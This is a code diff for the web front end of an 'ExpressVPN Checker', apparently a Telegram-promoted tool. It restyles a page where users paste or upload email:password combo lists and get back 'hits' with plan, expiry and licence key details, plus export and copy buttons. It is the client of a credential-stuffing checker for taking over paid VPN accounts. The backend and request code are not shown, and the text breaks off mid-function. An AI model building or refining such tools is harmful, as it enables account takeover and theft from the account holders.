@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
 <meta name="theme-color" content="#0a0f1e" />
 <title>ExpressVPN Checker | By @SHAKIB2016</title>
 <style>
@@ -10,210 +10,367 @@
   html, body {
     background: linear-gradient(160deg, #0a0f1e 0%, #0c1222 60%, #101a30 100%);
     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Inter, system-ui, sans-serif;
-    color: #eef2ff; min-height: 100vh;
+    color: #eef2ff;
+    min-height: 100vh;
+    height: 100vh;
+    overflow: hidden;
+    -webkit-tap-highlight-color: transparent;
   }
-  .wrap { max-width: 1200px; margin: 0 auto; padding: 16px; }
 
+  .wrap {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 12px 14px;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  /* ===== Header ===== */
   header {
-    text-align: center; padding: 20px 12px;
-    background: rgba(18,25,45,0.75);
-    border-radius: 20px;
-    border: 1px solid rgba(56,189,248,0.18);
-    margin-bottom: 14px;
+    text-align: center;
+    padding: 14px 12px;
+    background: rgba(18, 25, 45, 0.75);
+    border-radius: 18px;
+    border: 1px solid rgba(56, 189, 248, 0.18);
+    flex-shrink: 0;
   }
   header h1 {
-    font-size: 1.5rem;
+    font-size: 1.35rem;
     background: linear-gradient(135deg, #c084fc, #38bdf8);
-    -webkit-background-clip: text; background-clip: text; color: transparent;
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
     font-weight: 800;
+    letter-spacing: -0.4px;
   }
-  header p { margin-top: 6px; font-size: 0.78rem; color: #9ca3af; }
-  header p a { color: #38bdf8; text-decoration: none; }
+  header p { margin-top: 4px; font-size: 0.72rem; color: #9ca3af; }
+  header p a { color: #38bdf8; text-decoration: none; font-weight: 600; }
 
   /* ===== Login ===== */
   .login-box {
-    max-width: 400px; margin: 60px auto;
-    background: rgba(18,25,45,0.85);
+    max-width: 400px;
+    margin: 40px auto;
+    background: rgba(18, 25, 45, 0.85);
     padding: 28px 22px;
     border-radius: 20px;
-    border: 1px solid rgba(56,189,248,0.2);
-    box-shadow: 0 10px 32px rgba(0,0,0,0.4);
+    border: 1px solid rgba(56, 189, 248, 0.2);
+    box-shadow: 0 10px 32px rgba(0, 0, 0, 0.4);
   }
-  .login-box h2 { text-align: center; margin-bottom: 20px; font-size: 1.2rem; }
+  .login-box h2 { text-align: center; margin-bottom: 20px; font-size: 1.1rem; }
   .field { margin-bottom: 14px; }
-  .field label { font-size: 0.78rem; color: #cbd5e1; display: block; margin-bottom: 5px; }
+  .field label { font-size: 0.76rem; color: #cbd5e1; display: block; margin-bottom: 5px; }
   .field input {
-    width: 100%; background: rgba(15,23,42,0.9);
-    border: 1px solid #2d3a5e; border-radius: 10px;
-    padding: 11px 12px; color: #e2e8f0; font-size: 0.9rem;
+    width: 100%;
+    background: rgba(15, 23, 42, 0.9);
+    border: 1px solid #2d3a5e;
+    border-radius: 10px;
+    padding: 11px 12px;
+    color: #e2e8f0;
+    font-size: 0.9rem;
   }
   .field input:focus { outline: none; border-color: #3b82f6; }
   .btn-main {
-    width: 100%; padding: 12px;
+    width: 100%;
+    padding: 12px;
     background: linear-gradient(95deg, #3b82f6, #8b5cf6);
-    border: none; border-radius: 12px;
-    color: white; font-weight: 700; font-size: 0.9rem;
-    cursor: pointer; margin-top: 6px;
+    border: none;
+    border-radius: 12px;
+    color: white;
+    font-weight: 700;
+    font-size: 0.9rem;
+    cursor: pointer;
+    margin-top: 6px;
   }
   .btn-main:disabled { opacity: 0.6; }
 
-  /* ===== Tabs ===== */
-  .tabs {
-    display: flex; gap: 6px;
-    background: rgba(18,25,45,0.75);
-    padding: 6px; border-radius: 16px;
-    border: 1px solid rgba(56,189,248,0.15);
-    margin-bottom: 14px; overflow-x: auto;
-  }
-  .tab {
-    flex: 1; min-width: 88px; text-align: center;
-    padding: 10px 8px; border-radius: 12px;
-    background: transparent; color: #cbd5e1;
-    font-size: 0.78rem; font-weight: 600;
-    cursor: pointer; border: none; white-space: nowrap;
-  }
-  .tab.active { background: linear-gradient(135deg,#3b82f6,#8b5cf6); color: white; }
-  .tab .badge {
-    display: inline-block; background: rgba(255,255,255,0.22);
-    padding: 1px 7px; border-radius: 20px;
-    font-size: 0.68rem; margin-left: 4px;
-  }
-
-  .panel {
-    display: none;
-    background: rgba(18,25,45,0.75);
-    border-radius: 20px;
-    border: 1px solid rgba(56,189,248,0.15);
-    padding: 16px;
-  }
-  .panel.active { display: block; }
-
+  /* ===== User bar ===== */
   .userbar {
-    display: flex; justify-content: space-between; align-items: center;
-    background: rgba(15,23,42,0.85);
-    padding: 10px 14px; border-radius: 14px;
-    margin-bottom: 12px;
-    border: 1px solid #1e293b; font-size: 0.8rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: rgba(15, 23, 42, 0.85);
+    padding: 8px 14px;
+    border-radius: 12px;
+    border: 1px solid #1e293b;
+    font-size: 0.78rem;
+    flex-shrink: 0;
   }
   .userbar .who b { color: #38bdf8; }
   .userbar .logout {
-    background: #334155; border: none; color: white;
-    padding: 6px 12px; border-radius: 20px;
-    font-size: 0.72rem; cursor: pointer;
+    background: #334155;
+    border: none;
+    color: white;
+    padding: 5px 12px;
+    border-radius: 20px;
+    font-size: 0.7rem;
+    cursor: pointer;
   }
 
-  label { display: block; font-size: 0.85rem; color: #cbd5e1; margin-bottom: 8px; font-weight: 600; }
+  /* ===== Tabs ===== */
+  .tabs {
+    display: flex;
+    gap: 5px;
+    background: rgba(18, 25, 45, 0.75);
+    padding: 5px;
+    border-radius: 14px;
+    border: 1px solid rgba(56, 189, 248, 0.15);
+    overflow-x: auto;
+    scrollbar-width: none;
+    flex-shrink: 0;
+  }
+  .tabs::-webkit-scrollbar { display: none; }
+  .tab {
+    flex: 1;
+    min-width: 82px;
+    text-align: center;
+    padding: 9px 6px;
+    border-radius: 10px;
+    background: transparent;
+    color: #cbd5e1;
+    font-size: 0.74rem;
+    font-weight: 600;
+    cursor: pointer;
+    border: none;
+    white-space: nowrap;
+    transition: all 0.2s;
+  }
+  .tab.active {
+    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+    color: white;
+    box-shadow: 0 4px 12px rgba(59, 130, 246, 0.35);
+  }
+  .tab .badge {
+    display: inline-block;
+    background: rgba(255, 255, 255, 0.22);
+    padding: 1px 7px;
+    border-radius: 20px;
+    font-size: 0.65rem;
+    margin-left: 3px;
+  }
+
+  /* ===== Panel container – flex-based, scrollable body ===== */
+  .panel-container {
+    flex: 1;
+    min-height: 0;             /* important for flex child to shrink */
+    display: flex;
+    flex-direction: column;
+  }
+  .panel {
+    display: none;
+    background: rgba(18, 25, 45, 0.75);
+    border-radius: 18px;
+    border: 1px solid rgba(56, 189, 248, 0.15);
+    padding: 14px;
+    flex: 1;
+    min-height: 0;
+    flex-direction: column;
+    overflow: hidden;
+  }
+  .panel.active { display: flex; }
+  .panel .scroll-area {
+    flex: 1;
+    min-height: 0;
+    overflow-y: auto;
+    padding-right: 4px;
+  }
+  .panel .scroll-area::-webkit-scrollbar { width: 6px; }
+  .panel .scroll-area::-webkit-scrollbar-track { background: rgba(15, 23, 42, 0.5); border-radius: 10px; }
+  .panel .scroll-area::-webkit-scrollbar-thumb {
+    background: linear-gradient(180deg, #38bdf8, #818cf8);
+    border-radius: 10px;
+  }
+
+  /* ===== Form ===== */
+  label { display: block; font-size: 0.82rem; color: #cbd5e1; margin-bottom: 6px; font-weight: 600; }
   textarea {
-    width: 100%; min-height: 160px;
-    background: rgba(15,23,42,0.9);
+    width: 100%;
+    min-height: 130px;
+    max-height: 260px;
+    background: rgba(15, 23, 42, 0.9);
     border: 1px solid #2d3a5e;
-    border-radius: 14px; padding: 12px;
-    color: #e2e8f0; font-family: monospace;
-    font-size: 0.82rem; resize: vertical;
+    border-radius: 14px;
+    padding: 11px;
+    color: #e2e8f0;
+    font-family: 'SF Mono', Consolas, monospace;
+    font-size: 0.78rem;
+    resize: vertical;
   }
-  textarea:focus { outline: none; border-color: #3b82f6; }
+  textarea:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15); }
 
-  .file-row { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0 14px; }
+  .file-row { display: flex; flex-wrap: wrap; gap: 8px; margin: 8px 0 10px; }
   .file-label {
-    background: #1e293b; border: 1px dashed #475569;
-    padding: 9px 14px; border-radius: 30px;
-    font-size: 0.78rem; color: #cbd5e1; cursor: pointer;
+    background: #1e293b;
+    border: 1px dashed #475569;
+    padding: 8px 14px;
+    border-radius: 30px;
+    font-size: 0.76rem;
+    color: #cbd5e1;
+    cursor: pointer;
+    transition: 0.2s;
   }
+  .file-label:hover { background: #334155; border-color: #38bdf8; }
   .file-label input { display: none; }
 
-  .btn-row { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 12px; }
+  .btn-row { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
   button {
     background: linear-gradient(95deg, #3b82f6, #2563eb);
-    border: none; font-weight: 700;
-    padding: 11px 20px; border-radius: 30px;
-    color: white; cursor: pointer;
-    font-size: 0.85rem; flex: 1; min-width: 110px;
+    border: none;
+    font-weight: 700;
+    padding: 10px 18px;
+    border-radius: 30px;
+    color: white;
+    cursor: pointer;
+    font-size: 0.82rem;
+    flex: 1;
+    min-width: 100px;
+    transition: 0.2s;
   }
+  button:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 6px 16px rgba(59, 130, 246, 0.3); }
   button:disabled { opacity: 0.5; cursor: not-allowed; }
   button.stop { background: linear-gradient(95deg, #ef4444, #b91c1c); }
   button.ghost { background: #334155; }
   button.green { background: linear-gradient(95deg, #22c55e, #16a34a); }
 
+  /* ===== Stats ===== */
   .stats {
     display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
-    gap: 10px; margin-top: 14px;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 8px;
+    margin-top: 12px;
+    flex-shrink: 0;
   }
   .stat {
-    background: rgba(15,23,42,0.9);
-    border-radius: 14px; padding: 12px;
-    text-align: center; border: 1px solid #1e293b;
+    background: rgba(15, 23, 42, 0.9);
+    border-radius: 12px;
+    padding: 10px 6px;
+    text-align: center;
+    border: 1px solid #1e293b;
     border-left: 3px solid #38bdf8;
   }
-  .stat .num { font-size: 1.4rem; font-weight: 800; }
-  .stat .label { font-size: 0.7rem; color: #94a3b8; margin-top: 2px; }
-  .stat.hit { border-left-color: #4ade80; } .stat.hit .num { color:#4ade80; }
-  .stat.fail { border-left-color: #f87171; } .stat.fail .num { color:#f87171; }
+  .stat .num { font-size: 1.25rem; font-weight: 800; }
+  .stat .label { font-size: 0.64rem; color: #94a3b8; margin-top: 2px; letter-spacing: 0.3px; }
+  .stat.hit { border-left-color: #4ade80; } .stat.hit .num { color: #4ade80; }
+  .stat.fail { border-left-color: #f87171; } .stat.fail .num { color: #f87171; }
 
-  .progress { height: 8px; background: #1e293b; border-radius: 20px; overflow: hidden; margin-top: 14px; }
-  .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg,#38bdf8,#818cf8); transition: width 0.3s; }
-  #status { margin-top: 10px; font-size: 0.78rem; color: #94a3b8; text-align: center; min-height: 18px; }
+  .progress { height: 8px; background: #1e293b; border-radius: 20px; overflow: hidden; margin-top: 12px; flex-shrink: 0; }
+  .progress-fill {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #38bdf8, #818cf8);
+    transition: width 0.3s;
+  }
+  #status { margin-top: 8px; font-size: 0.74rem; color: #94a3b8; text-align: center; min-height: 16px; flex-shrink: 0; }
 
+  /* ===== Hit cards – scroll area handles scroll ===== */
   .hit-list { display: flex; flex-direction: column; gap: 12px; }
   .hit-card {
-    background: linear-gradient(135deg, rgba(15,42,31,0.85), rgba(15,23,42,0.9));
-    border: 1px solid rgba(74,222,128,0.35);
+    background: linear-gradient(135deg, rgba(15, 42, 31, 0.85), rgba(15, 23, 42, 0.9));
+    border: 1px solid rgba(74, 222, 128, 0.35);
     border-left: 4px solid #4ade80;
-    border-radius: 16px; padding: 14px; position: relative;
+    border-radius: 14px;
+    padding: 13px;
+    position: relative;
+    flex-shrink: 0;
   }
   .hit-card .badge-hit {
-    background: linear-gradient(135deg,#22c55e,#16a34a);
-    color: white; font-size: 0.68rem; font-weight: 800;
-    padding: 4px 10px; border-radius: 20px;
+    background: linear-gradient(135deg, #22c55e, #16a34a);
+    color: white;
+    font-size: 0.65rem;
+    font-weight: 800;
+    padding: 3px 9px;
+    border-radius: 20px;
   }
-  .hit-card .fields { display: flex; flex-direction: column; gap: 6px; margin-top: 10px; }
-  .hit-card .field { display: flex; gap: 8px; font-size: 0.78rem; word-break: break-all; }
-  .hit-card .field .k { color: #94a3b8; min-width: 78px; }
+  .hit-card .fields { display: flex; flex-direction: column; gap: 5px; margin-top: 9px; }
+  .hit-card .field { display: flex; gap: 8px; font-size: 0.75rem; word-break: break-all; }
+  .hit-card .field .k { color: #94a3b8; min-width: 74px; flex-shrink: 0; }
   .hit-card .field .v { color: #f1f5f9; font-weight: 600; }
-  .hit-card .field .v.mono { font-family: monospace; background: rgba(0,0,0,0.25); padding: 1px 6px; border-radius: 6px; }
+  .hit-card .field .v.mono {
+    font-family: 'SF Mono', Consolas, monospace;
+    background: rgba(0, 0, 0, 0.28);
+    padding: 1px 6px;
+    border-radius: 6px;
+  }
   .hit-card .copy-btn {
-    position: absolute; top: 12px; right: 12px;
-    background: #1e293b; border: 1px solid #334155;
-    padding: 5px 10px; border-radius: 20px;
-    color: #cbd5e1; font-size: 0.68rem; cursor: pointer;
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    background: #1e293b;
+    border: 1px solid #334155;
+    padding: 4px 10px;
+    border-radius: 20px;
+    color: #cbd5e1;
+    font-size: 0.65rem;
+    cursor: pointer;
   }
+  .hit-card .copy-btn:hover { background: #334155; }
 
-  .mini-list { display: flex; flex-direction: column; gap: 6px; }
+  /* ===== Mini list ===== */
+  .mini-list { display: flex; flex-direction: column; gap: 5px; }
   .mini-item {
-    display: flex; justify-content: space-between; gap: 8px;
-    padding: 10px 12px; border-radius: 10px;
-    background: rgba(15,23,42,0.85);
+    display: flex;
+    justify-content: space-between;
+    gap: 8px;
+    padding: 9px 11px;
+    border-radius: 9px;
+    background: rgba(15, 23, 42, 0.85);
     border-left: 3px solid #334155;
-    font-size: 0.76rem; word-break: break-all;
+    font-size: 0.73rem;
+    word-break: break-all;
+    flex-shrink: 0;
   }
-  .mini-item.hit { border-left-color:#4ade80; }
-  .mini-item.fail { border-left-color:#f87171; }
-  .mini-item .s.hit { color:#4ade80; font-weight:700; }
-  .mini-item .s.fail { color:#f87171; font-weight:700; }
+  .mini-item.hit { border-left-color: #4ade80; }
+  .mini-item.fail { border-left-color: #f87171; }
+  .mini-item .s.hit { color: #4ade80; font-weight: 700; }
+  .mini-item .s.fail { color: #f87171; font-weight: 700; }
 
-  .empty { text-align:center; padding:40px 16px; color:#64748b; font-size:0.85rem; }
-  .empty .emo { font-size:2rem; display:block; margin-bottom:8px; }
+  .empty { text-align: center; padding: 40px 16px; color: #64748b; font-size: 0.84rem; }
+  .empty .emo { font-size: 1.8rem; display: block; margin-bottom: 8px; }
 
+  /* ===== Toast ===== */
   #toast {
-    position: fixed; bottom: 20px; left: 50%;
+    position: fixed;
+    bottom: 20px;
+    left: 50%;
     transform: translateX(-50%) translateY(20px);
-    background: #1e293b; color: white;
-    padding: 10px 18px; border-radius: 30px;
-    font-size: 0.8rem; border: 1px solid #334155;
-    opacity: 0; pointer-events: none; transition: all 0.3s;
+    background: #1e293b;
+    color: white;
+    padding: 9px 18px;
+    border-radius: 30px;
+    font-size: 0.78rem;
+    border: 1px solid #334155;
+    opacity: 0;
+    pointer-events: none;
+    transition: all 0.3s;
     z-index: 999;
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
   }
   #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  /* ===== Mobile tweaks ===== */
+  @media (max-width: 480px) {
+    .wrap { padding: 10px; gap: 10px; }
+    header { padding: 12px 10px; }
+    header h1 { font-size: 1.1rem; }
+    .tab { font-size: 0.68rem; min-width: 72px; padding: 8px 4px; }
+    .stat .num { font-size: 1.05rem; }
+    .stat .label { font-size: 0.58rem; }
+    .hit-card .field .k { min-width: 66px; }
+    .panel { padding: 12px; }
+  }
 </style>
 </head>
 <body>
-<div class="wrap">
 
-  <!-- ===== LOGIN PAGE ===== -->
-  <div id="loginPage">
+<!-- ============================================================ -->
+<!-- LOGIN PAGE -->
+<!-- ============================================================ -->
+<div id="loginPage">
+  <div class="wrap">
     <header>
       <h1>🔒 ExpressVPN Checker</h1>
-      <p>Config by <a href="https://t.me/shakib2016">@SHAKIB2016</a></p>
+      <p>Config by <a href="https://t.me/shakib2016" target="_blank">@SHAKIB2016</a></p>
     </header>
     <div class="login-box">
       <h2>🔑 Login Required</h2>
@@ -226,17 +383,22 @@
         <input id="authPass" type="password" autocomplete="current-password" placeholder="your password" />
       </div>
       <button class="btn-main" id="loginBtn">Login</button>
-      <p style="text-align:center;font-size:0.72rem;color:#64748b;margin-top:14px;">
+      <p style="text-align:center;font-size:0.7rem;color:#64748b;margin-top:14px;">
         শুধু অনুমোদিত ইউজাররা চেক করতে পারবে
       </p>
     </div>
   </div>
+</div>
 
-  <!-- ===== MAIN APP ===== -->
-  <div id="appPage" style="display:none;">
+<!-- ============================================================ -->
+<!-- MAIN APP -->
+<!-- ============================================================ -->
+<div id="appPage" style="display:none; height:100vh;">
+  <div class="wrap">
+
     <header>
       <h1>🔒 ExpressVPN Checker</h1>
-      <p>Config by <a href="https://t.me/shakib2016">@SHAKIB2016</a></p>
+      <p>Config by <a href="https://t.me/shakib2016" target="_blank">@SHAKIB2016</a></p>
     </header>
 
     <div class="userbar">
@@ -251,58 +413,74 @@
       <button class="tab" data-tab="all">📋 All</button>
     </div>
 
-    <section class="panel active" id="panel-combo">
-      <label>📋 Paste combos (email:password) — one per line</label>
-      <textarea id="comboInput" placeholder="example@gmail.com:password123&#10;another@mail.com:pass456"></textarea>
+    <div class="panel-container">
 
-      <div class="file-row">
-        <label class="file-label">📁 Upload .txt<input type="file" id="fileInput" accept=".txt,text/plain"></label>
-        <label class="file-label" id="clearInput">🗑️ Clear</label>
-      </div>
+      <!-- ===== Combo Panel ===== -->
+      <section class="panel active" id="panel-combo">
+        <div class="scroll-area" style="display:flex; flex-direction:column;">
+          <label>📋 Paste combos (email:password) — one per line</label>
+          <textarea id="comboInput" placeholder="example@gmail.com:password123&#10;another@mail.com:pass456"></textarea>
 
-      <div class="btn-row">
-        <button id="startBtn" class="green">▶ Start</button>
-        <button id="stopBtn" class="stop" disabled>⏹ Stop</button>
-      </div>
+          <div class="file-row">
+            <label class="file-label">📁 Upload .txt<input type="file" id="fileInput" accept=".txt,text/plain"></label>
+            <label class="file-label" id="clearInput">🗑️ Clear</label>
+          </div>
 
-      <div class="stats">
-        <div class="stat"><div class="num" id="statTotal">0</div><div class="label">Total</div></div>
-        <div class="stat"><div class="num" id="statChecked">0</div><div class="label">Checked</div></div>
-        <div class="stat hit"><div class="num" id="statHits">0</div><div class="label">🔥 HITS</div></div>
-        <div class="stat fail"><div class="num" id="statFails">0</div><div class="label">❌ FAIL</div></div>
-      </div>
+          <div class="btn-row">
+            <button id="startBtn" class="green">▶ Start</button>
+            <button id="stopBtn" class="stop" disabled>⏹ Stop</button>
+          </div>
 
-      <div class="progress"><div class="progress-fill" id="progressFill"></div></div>
-      <div id="status">⚡ Ready</div>
+          <div class="btn-row" style="margin-top:8px;">
+            <button id="exportHits" class="ghost">📥 Export Hits</button>
+            <button id="exportAll" class="ghost">📄 Export All</button>
+          </div>
+        </div>
 
-      <div class="btn-row" style="margin-top:14px;">
-        <button id="exportHits" class="ghost">📥 Export Hits</button>
-        <button id="exportAll" class="ghost">📄 Export All</button>
-      </div>
-    </section>
+        <div class="stats">
+          <div class="stat"><div class="num" id="statTotal">0</div><div class="label">TOTAL</div></div>
+          <div class="stat"><div class="num" id="statChecked">0</div><div class="label">CHECKED</div></div>
+          <div class="stat hit"><div class="num" id="statHits">0</div><div class="label">🔥 HITS</div></div>
+          <div class="stat fail"><div class="num" id="statFails">0</div><div class="label">❌ FAIL</div></div>
+        </div>
 
-    <section class="panel" id="panel-stats">
-      <div class="stats">
-        <div class="stat"><div class="num" id="statTotal2">0</div><div class="label">Total</div></div>
-        <div class="stat"><div class="num" id="statChecked2">0</div><div class="label">Checked</div></div>
-        <div class="stat hit"><div class="num" id="statHits2">0</div><div class="label">🔥 HITS</div></div>
-        <div class="stat fail"><div class="num" id="statFails2">0</div><div class="label">❌ FAIL</div></div>
-      </div>
-      <div class="progress" style="margin-top:20px;"><div class="progress-fill" id="progressFill2"></div></div>
-      <div id="status2" style="margin-top:10px;text-align:center;font-size:.8rem;color:#94a3b8;">⚡ Ready</div>
-    </section>
+        <div class="progress"><div class="progress-fill" id="progressFill"></div></div>
+        <div id="status">⚡ Ready</div>
+      </section>
 
-    <section class="panel" id="panel-hits">
-      <div class="hit-list" id="hitList">
-        <div class="empty"><span class="emo">🔥</span>No hits yet.</div>
-      </div>
-    </section>
+      <!-- ===== Stats Panel ===== -->
+      <section class="panel" id="panel-stats">
+        <div class="scroll-area">
+          <div class="stats" style="margin-top:0;">
+            <div class="stat"><div class="num" id="statTotal2">0</div><div class="label">TOTAL</div></div>
+            <div class="stat"><div class="num" id="statChecked2">0</div><div class="label">CHECKED</div></div>
+            <div class="stat hit"><div class="num" id="statHits2">0</div><div class="label">🔥 HITS</div></div>
+            <div class="stat fail"><div class="num" id="statFails2">0</div><div class="label">❌ FAIL</div></div>
+          </div>
+          <div class="progress" style="margin-top:16px;"><div class="progress-fill" id="progressFill2"></div></div>
+          <div id="status2" style="margin-top:10px;text-align:center;font-size:.78rem;color:#94a3b8;">⚡ Ready</div>
+        </div>
+      </section>
 
-    <section class="panel" id="panel-all">
-      <div class="mini-list" id="allList">
-        <div class="empty"><span class="emo">📋</span>No results yet.</div>
-      </div>
-    </section>
+      <!-- ===== Hits Panel (scrollable) ===== -->
+      <section class="panel" id="panel-hits">
+        <div class="scroll-area" id="hitsScroll">
+          <div class="hit-list" id="hitList">
+            <div class="empty"><span class="emo">🔥</span>No hits yet.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== All Panel (scrollable) ===== -->
+      <section class="panel" id="panel-all">
+        <div class="scroll-area">
+          <div class="mini-list" id="allList">
+            <div class="empty"><span class="emo">📋</span>No results yet.</div>
+          </div>
+        </div>
+      </section>
+
+    </div>
   </div>
 </div>
 
@@ -330,7 +508,8 @@ async function doLogin() {
   if (!username || !password) return showToast('❌ Enter username & password');
 
   const btn = document.getElementById('loginBtn');
-  btn.disabled = true; btn.textContent = 'Logging in...';
+  btn.disabled = true;
+  btn.textContent = 'Logging in...';
 
   try {
     const res = await fetch('/api/auth?action=login', {
@@ -341,7 +520,8 @@ async function doLogin() {
     const data = await res.json();
     if (!data.ok) {
       showToast('❌ ' + (data.message || 'Login failed'));
-      btn.disabled = false; btn.textContent = 'Login';
+      btn.disabled = false;
+      btn.textContent = 'Login';
       return;
     }
     saveToken(data.token);
@@ -349,7 +529,8 @@ async function doLogin() {
     showApp(data.user.username);
   } catch (e) {
     showToast('❌ ' + e.message);
-    btn.disabled = false; btn.textContent = 'Login';
+    btn.disabled = false;
+    btn.textContent = 'Login';
   }
 }
 
@@ -414,7 +595,10 @@ const allList = document.getElementById('allList');
 const tabHitCount = document.getElementById('tabHitCount');
 const toastEl = document.getElementById('toast');
 
-let combos = [], results = [], running = false, currentIdx = 0;
+let combos = [];
+let results = [];
+let running = false;
+let currentIdx = 0;
 let stats = { total: 0, checked: 0, hits: 0, fails: 0 };
 
 function showToast(msg) {
@@ -424,59 +608,79 @@ function showToast(msg) {
 }
 
 fileInput.addEventListener('change', e => {
-  const f = e.target.files[0]; if (!f) return;
+  const f = e.target.files[0];
+  if (!f) return;
   const r = new FileReader();
-  r.onload = ev => { comboInput.value = ev.target.result; showToast('📁 ' + f.name); };
-  r.readAsText(f); fileInput.value = '';
+  r.onload = ev => {
+    comboInput.value = ev.target.result;
+    showToast('📁 ' + f.name);
+  };
+  r.readAsText(f);
+  fileInput.value = '';
 });
-clearInput.addEventListener('click', () => { comboInput.value = ''; showToast('🗑️ Cleared'); });
+clearInput.addEventListener('click', () => {
+  comboInput.value = '';
+  showToast('🗑️ Cleared');
+});
 
 function parseCombos(raw) {
   const out = [];
   raw.split(/\r?\n/).forEach(l => {
-    const t = l.trim(); if (!t) return;
-    const i = t.indexOf(':'); if (i === -1) return;
-    const u = t.slice(0, i).trim(), p = t.slice(i + 1).trim();
+    const t = l.trim();
+    if (!t) return;
+    const i = t.indexOf(':');
+    if (i === -1) return;
+    const u = t.slice(0, i).trim();
+    const p = t.slice(i + 1).trim();
     if (u && p) out.push({ username: u, password: p });
   });
   return out;
 }
 
 function updateStats() {
-  ['statTotal','statTotal2'].forEach(id => document.getElementById(id).textContent = stats.total);
-  ['statChecked','statChecked2'].forEach(id => document.getElementById(id).textContent = stats.checked);
-  ['statHits','statHits2'].forEach(id => document.getElementById(id).textContent = stats.hits);
-  ['statFails','statFails2'].forEach(id => document.getElementById(id).textContent = stats.fails);
+  ['statTotal', 'statTotal2'].forEach(id => document.getElementById(id).textContent = stats.total);
+  ['statChecked', 'statChecked2'].forEach(id => document.getElementById(id).textContent = stats.checked);
+  ['statHits', 'statHits2'].forEach(id => document.getElementById(id).textContent = stats.hits);
+  ['statFails', 'statFails2'].forEach(id => document.getElementById(id).textContent = stats.fails);
   tabHitCount.textContent = stats.hits;
   const pct = stats.total ? (stats.checked / stats.total) * 100 : 0;
   progressFill.style.width = pct + '%';
   progressFill2.style.width = pct + '%';
 }
-function setStatus(m) { statusEl.textContent = m; statusEl2.textContent = m; }
+
+function setStatus(m) {
+  statusEl.textContent = m;
+  statusEl2.textContent = m;
+}
+
 function escapeHtml(s) {
   if (s == null) return '';
-  return String(s).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
+  return String(s).replace(/[&<>"']/g, m => ({
+    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+  }[m]));
 }
 
 function renderAll() {
+  // Hits
   const hits = results.filter(r => r.hit);
   if (!hits.length) {
     hitList.innerHTML = '<div class="empty"><span class="emo">🔥</span>No hits yet.</div>';
   } else {
     hitList.innerHTML = hits.map(h => `
       <div class="hit-card">
-        <button class="copy-btn" data-combo="${escapeHtml(h.username+':'+h.password)}">📋 Copy</button>
+        <button class="copy-btn" data-combo="${escapeHtml(h.username + ':' + h.password)}">📋 Copy</button>
         <span class="badge-hit">🔥 HIT · SUBSCRIPTION VALID</span>
         <div class="fields">
           <div class="field"><span class="k">📧 Email:</span><span class="v mono">${escapeHtml(h.username)}</span></div>
           <div class="field"><span class="k">🔑 Password:</span><span class="v mono">${escapeHtml(h.password)}</span></div>
-          <div class="field"><span class="k">📋 Plan:</span><span class="v">${escapeHtml(h.plan||'—')}</span></div>
-          <div class="field"><span class="k">📅 Expiry:</span><span class="v">${escapeHtml(h.expiry||'—')}</span></div>
-          <div class="field"><span class="k">🔑 PC Key:</span><span class="v mono">${escapeHtml(h.pcKey||'—')}</span></div>
-          <div class="field"><span class="k">📅 Key Expiry:</span><span class="v">${escapeHtml(h.keyExpire||'—')}</span></div>
-          <div class="field"><span class="k">📌 Status:</span><span class="v">${escapeHtml(h.keyStatus||'—')}</span></div>
+          <div class="field"><span class="k">📋 Plan:</span><span class="v">${escapeHtml(h.plan || '—')}</span></div>
+          <div class="field"><span class="k">📅 Expiry:</span><span class="v">${escapeHtml(h.expiry || '—')}</span></div>
+          <div class="field"><span class="k">🔑 PC Key:</span><span class="v mono">${escapeHtml(h.pcKey || '—')}</span></div>
+          <div class="field"><span class="k">📅 Key Expiry:</span><span class="v">${escapeHtml(h.keyExpire || '—')}</span></div>
+          <div class="field"><span class="k">📌 Status:</span><span class="v">${escapeHtml(h.keyStatus || '—')}</span></div>
         </div>
-      </div>`).join('');
+      </div>
+    `).join('');
     hitList.querySelectorAll('.copy-btn').forEach(b => {
       b.addEventListener('click', () => {
         navigator.clipboard.writeText(b.dataset.combo).then(() => showToast('📋 Copied'));
@@ -484,6 +688,7 @@ function renderAll() {
     });
   }
 
+  // All
   if (!results.length) {
     allList.innerHTML = '<div class="empty"><span class="emo">📋</span>No results yet.</div>';
   } else {
@@ -491,7 +696,8 @@ function renderAll() {
       const cls = r.hit ? 'hit' : 'fail';
       return `<div class="mini-item ${cls}">
         <span>${escapeHtml(r.username)}:${escapeHtml(r.password)}</span>
-        <span class="s ${cls}">${r.hit?'🔥 HIT':'❌ FAIL'}</span></div>`;
+        <span class="s ${cls}">${r.hit ? '🔥 HIT' : '❌ FAIL'}</span>
+      </div>`;
     }).join('');
   }
 }
@@ -505,15 +711,22 @@ async function checkOne(username, password) {
     });
     if (res.status === 401) {
       showToast('🔒 Session expired');
-      saveToken(null); showLogin(); return null;
+      saveToken(null);
+      showLogin();
+      return null;
     }
     const json = await res.json();
     return {
-      username, password,
-      valid: json.valid === true, hit: json.hit === true,
-      plan: json.plan || null, expiry: json.expiry || null,
-      pcKey: json.pcKey || null, keyExpire: json.keyExpire || null,
-      keyStatus: json.keyStatus || null, message: json.message || ''
+      username,
+      password,
